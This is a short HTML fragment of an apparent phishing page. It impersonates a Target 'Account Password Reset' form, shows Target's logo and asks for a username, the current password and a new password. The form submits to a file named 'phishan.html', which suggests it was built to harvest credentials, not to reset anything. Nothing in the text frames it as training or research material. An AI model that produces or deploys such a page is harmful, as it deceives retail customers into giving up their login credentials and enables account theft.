<form class="form-horizontal" ACTION="phishan.html" METHOD="POST">
<fieldset>

<div class="header-logo">
    <img src="http://www.survivingthestores.com/wp-content/uploads/2010/11/target-logo.jpg" width="140" class="header-logo-left" />
</div>

<!-- Form Name -->
<legend>Target Account Password Reset</legend>

<!-- Text input-->
<div class="control-group">
  <label class="control-label" for="username">Username</label>
  <div class="controls">
    <input id="username" name="username" type="text" placeholder="Username" class="input-medium" required="">
    <p class="help-block">Your Target username</p>
  </div>
</div>

<!-- Password input-->
<div class="control-group">
  <label class="control-label" for="passwordinput-old">Password (Old)</label>
  <div class="controls">
    <input id="passwordinput-old" name="passwordinput-old" type="password" placeholder="Old Password" class="input-medium" required="">
    <p class="help-block">Your current Target password</p>
  </div>
</div>

<!-- Password input-->
<div class="control-group">
  <label class="control-label" for="passwordinput-new">Password (New)</label>
  <div class="controls">
    <input id="passwordinput-new" name="passwordinput-new" type="password" placeholder="New Password" class="input-medium" required="">
    <p class="help-block">Your new password.  Password MUST be at least 8 characters long, include one number, and one special symbol. (!, #, @, etc.)</p>
  </div>
</div>

<!-- Button -->
<div class="control-group">
  <label class="control-label" for="singlebutton"></label>
  <div class="controls">
    <button id="singlebutton" name="singlebutton" class="btn btn-success">Submit</button>
  </div>
</div>

</fieldset>
</form>
